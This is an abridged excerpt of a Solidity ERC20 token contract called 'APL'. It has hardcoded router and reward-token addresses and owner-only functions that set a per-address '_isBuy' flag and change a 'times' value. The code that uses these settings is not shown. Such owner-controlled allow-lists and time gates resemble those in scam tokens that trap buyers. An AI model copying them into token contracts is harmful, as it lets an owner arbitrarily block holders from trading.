...
contract Token is ERC20, Ownable {
    ...
    address public lpRewardToken = 0x5d6eC82629603a10f56B849bb4Cd9CC6a7057893; 
    ...
    uint256 public times = 1655179200;
    
    uint256 distributorGas = 300000;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor() payable ERC20("APL", "APL")  {
        uint256 totalSupply = 1000000 * (10**18);
        swapTokensAtAmount = 100 * (10**18);
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xFa1beF08f979155e14b604c6a4f1A5b2C3209af9);
    ...
    function setBuy(address account, bool excluded) public onlyOwner {
        if(_isBuy[account] != excluded){
            _isBuy[account] = excluded;
        }
    }
    function setMultipleAccountsBuy(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isBuy[accounts[i]] = excluded;
        }
    }
   
    function isBuy(address account) public view returns(bool) {
        return _isBuy[account];
    }
    ...
    function settimes(uint256 t) public onlyOwner{
        times = t;
    }
